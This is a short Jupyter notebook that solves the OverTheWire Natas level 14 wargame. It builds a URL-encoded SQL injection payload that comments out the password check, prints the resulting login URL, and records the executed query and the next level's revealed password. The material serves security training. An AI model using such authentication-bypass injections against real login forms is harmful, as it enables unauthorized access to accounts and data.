{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://natas14.natas.labs.overthewire.org/index.php?username=natas15%22%3B%23&password=123&debug=0\n"
     ]
    }
   ],
   "source": [
    "import urllib.parse\n",
    "username = 'natas15\";#'\n",
    "password = \"123\"\n",
    "\n",
    "print(f\"http://natas14.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}&debug=0\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Executing query: SELECT * from users where username=\"natas15\";#\" and password=\"123\"\n",
    "# Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
